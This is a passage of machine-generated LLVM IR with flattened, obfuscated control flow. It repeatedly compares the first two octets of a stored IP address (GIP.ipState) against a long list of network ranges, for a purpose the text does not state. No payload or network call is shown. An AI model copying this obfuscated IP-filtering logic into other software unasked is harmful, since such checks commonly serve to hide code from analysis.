  %855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %856 = zext i8 %855 to i32
  %857 = icmp eq i32 %856, 147
  %858 = select i1 %857, i32 -1836461685, i32 -1803576170
  store i32 %858, i32* %switchVar
  br label %loopEnd

; <label>:859:                                    ; preds = %loopEntry
  %860 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %861 = zext i8 %860 to i32
  %862 = icmp sge i32 %861, 238
  %863 = select i1 %862, i32 483346679, i32 -1803576170
  store i32 %863, i32* %switchVar
  br label %loopEnd

; <label>:864:                                    ; preds = %loopEntry
  %865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %866 = zext i8 %865 to i32
  %867 = icmp slt i32 %866, 255
  %868 = select i1 %867, i32 -1813357520, i32 -1803576170
  store i32 %868, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:869:                                    ; preds = %loopEntry
  %870 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %871 = zext i8 %870 to i32
  %872 = icmp eq i32 %871, 150
  %873 = select i1 %872, i32 1418912090, i32 852620286
  store i32 %873, i32* %switchVar
  br label %loopEnd

; <label>:874:                                    ; preds = %loopEntry
  %875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %876 = zext i8 %875 to i32
  %877 = icmp sge i32 %876, 113
  %878 = select i1 %877, i32 1686886427, i32 852620286
  store i32 %878, i32* %switchVar
  br label %loopEnd

; <label>:879:                                    ; preds = %loopEntry
  %880 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %881 = zext i8 %880 to i32
  %882 = icmp slt i32 %881, 115
  %883 = select i1 %882, i32 -1813357520, i32 852620286
  store i32 %883, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  %885 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %886 = zext i8 %885 to i32
  %887 = icmp eq i32 %886, 152
  %888 = select i1 %887, i32 557773894, i32 -1018793025
  store i32 %888, i32* %switchVar
  br label %loopEnd

; <label>:889:                                    ; preds = %loopEntry
  %890 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %891 = zext i8 %890 to i32
  %892 = icmp sge i32 %891, 151
  %893 = select i1 %892, i32 1935661226, i32 -1018793025
  store i32 %893, i32* %switchVar
  br label %loopEnd

; <label>:894:                                    ; preds = %loopEntry
  %895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %896 = zext i8 %895 to i32
  %897 = icmp slt i32 %896, 155
  %898 = select i1 %897, i32 -1813357520, i32 -1018793025
  store i32 %898, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  %900 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %901 = zext i8 %900 to i32
  %902 = icmp eq i32 %901, 153
  %903 = select i1 %902, i32 622217177, i32 1811663536
  store i32 %903, i32* %switchVar
  br label %loopEnd

; <label>:904:                                    ; preds = %loopEntry
  %905 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %906 = zext i8 %905 to i32
  %907 = icmp sge i32 %906, 21
  %908 = select i1 %907, i32 3036677, i32 1811663536
  store i32 %908, i32* %switchVar
  br label %loopEnd

; <label>:909:                                    ; preds = %loopEntry
  %910 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %911 = zext i8 %910 to i32
  %912 = icmp slt i32 %911, 32
  %913 = select i1 %912, i32 -1813357520, i32 1811663536
  store i32 %913, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:914:                                    ; preds = %loopEntry
  %915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %916 = zext i8 %915 to i32
  %917 = icmp eq i32 %916, 155
  %918 = select i1 %917, i32 -104494355, i32 -97719774
  store i32 %918, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  %920 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %921 = zext i8 %920 to i32
  %922 = icmp sge i32 %921, 5
  %923 = select i1 %922, i32 640248729, i32 -97719774
  store i32 %923, i32* %switchVar
  br label %loopEnd

; <label>:924:                                    ; preds = %loopEntry
  %925 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %926 = zext i8 %925 to i32
  %927 = icmp slt i32 %926, 10
  %928 = select i1 %927, i32 -1813357520, i32 -97719774
  store i32 %928, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:929:                                    ; preds = %loopEntry
  %930 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %931 = zext i8 %930 to i32
  %932 = icmp eq i32 %931, 155
  %933 = select i1 %932, i32 -1203364876, i32 1679728761
  store i32 %933, i32* %switchVar
  br label %loopEnd

; <label>:934:                                    ; preds = %loopEntry
  %935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %936 = zext i8 %935 to i32
  %937 = icmp sge i32 %936, 74
  %938 = select i1 %937, i32 -332284992, i32 1679728761
  store i32 %938, i32* %switchVar
  br label %loopEnd

; <label>:939:                                    ; preds = %loopEntry
  %940 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %941 = zext i8 %940 to i32
  %942 = icmp slt i32 %941, 89
  %943 = select i1 %942, i32 -1813357520, i32 1679728761
  store i32 %943, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:944:                                    ; preds = %loopEntry
  %945 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %946 = zext i8 %945 to i32
  %947 = icmp eq i32 %946, 155
  %948 = select i1 %947, i32 879333532, i32 -709006689
  store i32 %948, i32* %switchVar
  br label %loopEnd

; <label>:949:                                    ; preds = %loopEntry
  %950 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %951 = zext i8 %950 to i32
  %952 = icmp sge i32 %951, 213
  %953 = select i1 %952, i32 -556160768, i32 -709006689
  store i32 %953, i32* %switchVar
  br label %loopEnd

; <label>:954:                                    ; preds = %loopEntry
  %955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %956 = zext i8 %955 to i32
  %957 = icmp slt i32 %956, 222
  %958 = select i1 %957, i32 -1813357520, i32 -709006689
  store i32 %958, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:959:                                    ; preds = %loopEntry
  %960 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %961 = zext i8 %960 to i32
  %962 = icmp eq i32 %961, 157
  %963 = select i1 %962, i32 -351247443, i32 -2108600264
  store i32 %963, i32* %switchVar
  br label %loopEnd

; <label>:964:                                    ; preds = %loopEntry
  %965 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %966 = zext i8 %965 to i32
  %967 = icmp sge i32 %966, 150
  %968 = select i1 %967, i32 2092503073, i32 -2108600264
  store i32 %968, i32* %switchVar
  br label %loopEnd

; <label>:969:                                    ; preds = %loopEntry
  %970 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %971 = zext i8 %970 to i32
  %972 = icmp slt i32 %971, 154
  %973 = select i1 %972, i32 -1813357520, i32 -2108600264
  store i32 %973, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:974:                                    ; preds = %loopEntry
  %975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %976 = zext i8 %975 to i32
  %977 = icmp eq i32 %976, 158
  %978 = select i1 %977, i32 -336980554, i32 -375119812
  store i32 %978, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  %980 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %981 = zext i8 %980 to i32
  %982 = icmp sge i32 %981, 1
  %983 = select i1 %982, i32 950017816, i32 -375119812
  store i32 %983, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %986 = zext i8 %985 to i32
  %987 = icmp slt i32 %986, 21
  %988 = select i1 %987, i32 -1813357520, i32 -375119812
  store i32 %988, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %991 = zext i8 %990 to i32
  %992 = icmp eq i32 %991, 158
  %993 = select i1 %992, i32 599658943, i32 -1605503182
  store i32 %993, i32* %switchVar
  br label %loopEnd

; <label>:994:                                    ; preds = %loopEntry
  %995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %996 = zext i8 %995 to i32
  %997 = icmp sge i32 %996, 235
  %998 = select i1 %997, i32 207288113, i32 -1605503182
  store i32 %998, i32* %switchVar
  br label %loopEnd

; <label>:999:                                    ; preds = %loopEntry
  %1000 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1001 = zext i8 %1000 to i32
  %1002 = icmp slt i32 %1001, 247
  %1003 = select i1 %1002, i32 -1813357520, i32 -1605503182
  store i32 %1003, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1004:                                   ; preds = %loopEntry
  %1005 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1006 = zext i8 %1005 to i32
  %1007 = icmp eq i32 %1006, 159
  %1008 = select i1 %1007, i32 -1321601254, i32 1446857347
  store i32 %1008, i32* %switchVar
  br label %loopEnd

; <label>:1009:                                   ; preds = %loopEntry
  %1010 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1011 = zext i8 %1010 to i32
  %1012 = icmp sge i32 %1011, 120
  %1013 = select i1 %1012, i32 693638140, i32 1446857347
  store i32 %1013, i32* %switchVar
  br label %loopEnd

; <label>:1014:                                   ; preds = %loopEntry
  %1015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1016 = zext i8 %1015 to i32
  %1017 = icmp slt i32 %1016, 121
  %1018 = select i1 %1017, i32 -1813357520, i32 1446857347
  store i32 %1018, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1019:                                   ; preds = %loopEntry
  %1020 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1021 = zext i8 %1020 to i32
  %1022 = icmp eq i32 %1021, 160
  %1023 = select i1 %1022, i32 -1497423480, i32 -1098305148
  store i32 %1023, i32* %switchVar
  br label %loopEnd

; <label>:1024:                                   ; preds = %loopEntry
  %1025 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1026 = zext i8 %1025 to i32
  %1027 = icmp sge i32 %1026, 132
  %1028 = select i1 %1027, i32 1272191185, i32 -1098305148
  store i32 %1028, i32* %switchVar
  br label %loopEnd

; <label>:1029:                                   ; preds = %loopEntry
  %1030 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1031 = zext i8 %1030 to i32
  %1032 = icmp slt i32 %1031, 151
  %1033 = select i1 %1032, i32 -1813357520, i32 -1098305148
  store i32 %1033, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  %1035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1036 = zext i8 %1035 to i32
  %1037 = icmp eq i32 %1036, 64
  %1038 = select i1 %1037, i32 1662280798, i32 -803124016
  store i32 %1038, i32* %switchVar
  br label %loopEnd

; <label>:1039:                                   ; preds = %loopEntry
  %1040 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1041 = zext i8 %1040 to i32
  %1042 = icmp sge i32 %1041, 224
  %1043 = select i1 %1042, i32 -702877095, i32 -803124016
  store i32 %1043, i32* %switchVar
  br label %loopEnd

; <label>:1044:                                   ; preds = %loopEntry
  %1045 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1046 = zext i8 %1045 to i32
  %1047 = icmp slt i32 %1046, 227
  %1048 = select i1 %1047, i32 -1813357520, i32 -803124016
  store i32 %1048, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1049:                                   ; preds = %loopEntry
  %1050 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1051 = zext i8 %1050 to i32
  %1052 = icmp eq i32 %1051, 162
  %1053 = select i1 %1052, i32 -2081529102, i32 -409506800
  store i32 %1053, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1056 = zext i8 %1055 to i32
  %1057 = icmp sge i32 %1056, 45
  %1058 = select i1 %1057, i32 -906638660, i32 -409506800
  store i32 %1058, i32* %switchVar
  br label %loopEnd

; <label>:1059:                                   ; preds = %loopEntry
  %1060 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1061 = zext i8 %1060 to i32
  %1062 = icmp slt i32 %1061, 47
  %1063 = select i1 %1062, i32 -1813357520, i32 -409506800
  store i32 %1063, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1064:                                   ; preds = %loopEntry
  %1065 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1066 = zext i8 %1065 to i32
  %1067 = icmp eq i32 %1066, 163
  %1068 = select i1 %1067, i32 -1895296600, i32 -621975831
  store i32 %1068, i32* %switchVar
  br label %loopEnd

; <label>:1069:                                   ; preds = %loopEntry
  %1070 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1071 = zext i8 %1070 to i32
  %1072 = icmp sge i32 %1071, 205
  %1073 = select i1 %1072, i32 1882148725, i32 -621975831
  store i32 %1073, i32* %switchVar
  br label %loopEnd

; <label>:1074:                                   ; preds = %loopEntry
  %1075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1076 = zext i8 %1075 to i32
  %1077 = icmp slt i32 %1076, 207
  %1078 = select i1 %1077, i32 -1813357520, i32 -621975831
  store i32 %1078, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1079:                                   ; preds = %loopEntry
  %1080 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1081 = zext i8 %1080 to i32
  %1082 = icmp eq i32 %1081, 164
  %1083 = select i1 %1082, i32 -172875068, i32 -399230044
  store i32 %1083, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  %1085 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1086 = zext i8 %1085 to i32
  %1087 = icmp sge i32 %1086, 45
  %1088 = select i1 %1087, i32 760007451, i32 -399230044
  store i32 %1088, i32* %switchVar
  br label %loopEnd

; <label>:1089:                                   ; preds = %loopEntry
  %1090 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1091 = zext i8 %1090 to i32
  %1092 = icmp slt i32 %1091, 50
  %1093 = select i1 %1092, i32 -1813357520, i32 -399230044
  store i32 %1093, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1094:                                   ; preds = %loopEntry
  %1095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1096 = zext i8 %1095 to i32
  %1097 = icmp eq i32 %1096, 164
  %1098 = select i1 %1097, i32 -276183338, i32 164528589
  store i32 %1098, i32* %switchVar
  br label %loopEnd

; <label>:1099:                                   ; preds = %loopEntry
  %1100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1101 = zext i8 %1100 to i32
  %1102 = icmp sge i32 %1101, 217
  %1103 = select i1 %1102, i32 -159527102, i32 164528589
  store i32 %1103, i32* %switchVar
  br label %loopEnd

; <label>:1104:                                   ; preds = %loopEntry
  %1105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1106 = zext i8 %1105 to i32
  %1107 = icmp slt i32 %1106, 233
  %1108 = select i1 %1107, i32 -1813357520, i32 164528589
  store i32 %1108, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1109:                                   ; preds = %loopEntry
  %1110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1111 = zext i8 %1110 to i32
  %1112 = icmp eq i32 %1111, 169
  %1113 = select i1 %1112, i32 1471526082, i32 1989333209
  store i32 %1113, i32* %switchVar
  br label %loopEnd

; <label>:1114:                                   ; preds = %loopEntry
  %1115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = icmp sge i32 %1116, 252
  %1118 = select i1 %1117, i32 1116925630, i32 1989333209
  store i32 %1118, i32* %switchVar
  br label %loopEnd

; <label>:1119:                                   ; preds = %loopEntry
  %1120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1121 = zext i8 %1120 to i32
  %1122 = icmp slt i32 %1121, 254
  %1123 = select i1 %1122, i32 -1813357520, i32 1989333209
  store i32 %1123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1124:                                   ; preds = %loopEntry
  %1125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1126 = zext i8 %1125 to i32
  %1127 = icmp eq i32 %1126, 199
  %1128 = select i1 %1127, i32 167507925, i32 1823039124
  store i32 %1128, i32* %switchVar
  br label %loopEnd

; <label>:1129:                                   ; preds = %loopEntry
  %1130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1131 = zext i8 %1130 to i32
  %1132 = icmp sge i32 %1131, 121
  %1133 = select i1 %1132, i32 665591423, i32 1823039124
  store i32 %1133, i32* %switchVar
  br label %loopEnd

; <label>:1134:                                   ; preds = %loopEntry
  %1135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = icmp slt i32 %1136, 254
  %1138 = select i1 %1137, i32 -1813357520, i32 1823039124
  store i32 %1138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1139:                                   ; preds = %loopEntry
  %1140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1141 = zext i8 %1140 to i32
  %1142 = icmp eq i32 %1141, 205
  %1143 = select i1 %1142, i32 -1105476536, i32 1196664162
  store i32 %1143, i32* %switchVar
  br label %loopEnd

; <label>:1144:                                   ; preds = %loopEntry
  %1145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1146 = zext i8 %1145 to i32
  %1147 = icmp sge i32 %1146, 1
  %1148 = select i1 %1147, i32 1831109670, i32 1196664162
  store i32 %1148, i32* %switchVar
  br label %loopEnd

; <label>:1149:                                   ; preds = %loopEntry
  %1150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1151 = zext i8 %1150 to i32
  %1152 = icmp slt i32 %1151, 118
  %1153 = select i1 %1152, i32 -1813357520, i32 1196664162
  store i32 %1153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1154:                                   ; preds = %loopEntry
  %1155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1156 = zext i8 %1155 to i32
  %1157 = icmp eq i32 %1156, 207
  %1158 = select i1 %1157, i32 1704474967, i32 826582352
  store i32 %1158, i32* %switchVar
  br label %loopEnd

; <label>:1159:                                   ; preds = %loopEntry
  %1160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1161 = zext i8 %1160 to i32
  %1162 = icmp sge i32 %1161, 60
  %1163 = select i1 %1162, i32 -1366470681, i32 826582352
  store i32 %1163, i32* %switchVar
  br label %loopEnd

; <label>:1164:                                   ; preds = %loopEntry
  %1165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1166 = zext i8 %1165 to i32
  %1167 = icmp slt i32 %1166, 62
  %1168 = select i1 %1167, i32 -1813357520, i32 826582352
  store i32 %1168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1169:                                   ; preds = %loopEntry
  %1170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1171 = zext i8 %1170 to i32
  %1172 = icmp eq i32 %1171, 104
  %1173 = select i1 %1172, i32 704523582, i32 1179099137
  store i32 %1173, i32* %switchVar
  br label %loopEnd

; <label>:1174:                                   ; preds = %loopEntry
  %1175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1176 = zext i8 %1175 to i32
  %1177 = icmp sge i32 %1176, 16
  %1178 = select i1 %1177, i32 -718002571, i32 1179099137
  store i32 %1178, i32* %switchVar
  br label %loopEnd

; <label>:1179:                                   ; preds = %loopEntry
  %1180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1181 = zext i8 %1180 to i32
  %1182 = icmp slt i32 %1181, 31
  %1183 = select i1 %1182, i32 -1813357520, i32 1179099137
  store i32 %1183, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1184:                                   ; preds = %loopEntry
  %1185 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1186 = zext i8 %1185 to i32
  %1187 = icmp eq i32 %1186, 188
  %1188 = select i1 %1187, i32 1719756255, i32 2044230724
  store i32 %1188, i32* %switchVar
  br label %loopEnd

; <label>:1189:                                   ; preds = %loopEntry
  %1190 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1191 = zext i8 %1190 to i32
  %1192 = icmp eq i32 %1191, 166
  %1193 = select i1 %1192, i32 -1813357520, i32 2044230724
  store i32 %1193, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1194:                                   ; preds = %loopEntry
  %1195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1196 = zext i8 %1195 to i32
  %1197 = icmp eq i32 %1196, 188
  %1198 = select i1 %1197, i32 974280072, i32 939071382
  store i32 %1198, i32* %switchVar
  br label %loopEnd

; <label>:1199:                                   ; preds = %loopEntry
  %1200 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1201 = zext i8 %1200 to i32
  %1202 = icmp eq i32 %1201, 226
  %1203 = select i1 %1202, i32 -1813357520, i32 939071382
  store i32 %1203, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1204:                                   ; preds = %loopEntry
  %1205 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1206 = zext i8 %1205 to i32
  %1207 = icmp eq i32 %1206, 159
  %1208 = select i1 %1207, i32 586929801, i32 572474937
  store i32 %1208, i32* %switchVar
  br label %loopEnd

; <label>:1209:                                   ; preds = %loopEntry
  %1210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1211 = zext i8 %1210 to i32
  %1212 = icmp eq i32 %1211, 203
  %1213 = select i1 %1212, i32 -1813357520, i32 572474937
  store i32 %1213, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1214:                                   ; preds = %loopEntry
  %1215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1216 = zext i8 %1215 to i32
  %1217 = icmp eq i32 %1216, 162
  %1218 = select i1 %1217, i32 16455147, i32 -795693239
  store i32 %1218, i32* %switchVar
  br label %loopEnd

; <label>:1219:                                   ; preds = %loopEntry
  %1220 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1221 = zext i8 %1220 to i32
  %1222 = icmp eq i32 %1221, 243
  %1223 = select i1 %1222, i32 -1813357520, i32 -795693239
  store i32 %1223, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1224:                                   ; preds = %loopEntry
  %1225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1226 = zext i8 %1225 to i32
  %1227 = icmp eq i32 %1226, 45
  %1228 = select i1 %1227, i32 -1079546181, i32 -575705507
  store i32 %1228, i32* %switchVar
  br label %loopEnd

; <label>:1229:                                   ; preds = %loopEntry
  %1230 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1231 = zext i8 %1230 to i32
  %1232 = icmp eq i32 %1231, 55
  %1233 = select i1 %1232, i32 -1813357520, i32 -575705507
  store i32 %1233, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1234:                                   ; preds = %loopEntry
  %1235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1236 = zext i8 %1235 to i32
  %1237 = icmp eq i32 %1236, 178
  %1238 = select i1 %1237, i32 -1404020120, i32 1350142937
  store i32 %1238, i32* %switchVar
  br label %loopEnd

; <label>:1239:                                   ; preds = %loopEntry
  %1240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1241 = zext i8 %1240 to i32
  %1242 = icmp eq i32 %1241, 62
  %1243 = select i1 %1242, i32 -1813357520, i32 1350142937
  store i32 %1243, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1244:                                   ; preds = %loopEntry
  %1245 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1246 = zext i8 %1245 to i32
  %1247 = icmp eq i32 %1246, 104
  %1248 = select i1 %1247, i32 1241143418, i32 -2130100258
  store i32 %1248, i32* %switchVar
  br label %loopEnd

; <label>:1249:                                   ; preds = %loopEntry
  %1250 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1251 = zext i8 %1250 to i32
  %1252 = icmp eq i32 %1251, 131
  %1253 = select i1 %1252, i32 -1813357520, i32 -2130100258
  store i32 %1253, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1254:                                   ; preds = %loopEntry
  %1255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1256 = zext i8 %1255 to i32
  %1257 = icmp eq i32 %1256, 104
  %1258 = select i1 %1257, i32 -1136205511, i32 763334861
  store i32 %1258, i32* %switchVar
